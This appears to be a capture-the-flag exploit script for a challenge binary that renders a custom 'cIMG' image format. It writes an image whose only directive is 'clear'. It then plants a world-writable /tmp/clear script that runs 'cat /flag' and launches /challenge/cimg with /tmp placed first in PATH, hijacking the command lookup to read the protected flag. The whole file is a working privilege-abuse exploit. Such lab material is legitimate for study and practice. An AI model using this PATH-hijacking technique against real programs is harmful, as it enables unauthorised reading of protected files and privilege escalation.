import sys
import os
import subprocess

class CImgFile:
    def __init__(self):
        self.version = 4
        self.width = 80 
        self.height = 1
        self.directives = {
                'load_data' : 0x01,
                'patch_data' : 0x02,
                'load_sprite': 0x03,
                'render_sprite': 0x04,
                'load_sprite_from_file': 0x05,
                'clear': 0x06}
        self.remaining_directives = 0
        self.data = bytearray()

    def __header(self):
        return b'cIMG' + \
                int.to_bytes(self.version, 2, 'little') + \
                int.to_bytes(self.width, 1, 'little') + \
                int.to_bytes(self.height, 1, 'little') + \
                int.to_bytes(self.remaining_directives, 4, 'little')

    def __data(self):
        return self.data

    def generate_clear_command(self):
        self.remaining_directives +=1
        self.data += int.to_bytes(self.directives['clear'], 2, 'little') + b'\x00'

    def save(self, filename):
        self.generate_clear_command()

        with open(filename, 'wb') as f:
            f.write(self.__header())
            f.write(self.__data())

        with open('/tmp/clear', 'w') as f:
            f.write('#!/bin/sh\ncat /flag')

        os.chmod('/tmp/clear', 0o777)
        subprocess.run(['/usr/bin/env', f'PATH=/tmp:{os.environ['PATH']}', '/challenge/cimg', filename])

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <filename>')
        sys.exit(1)

    f = CImgFile()
    f.save(f'{sys.argv[1]}')
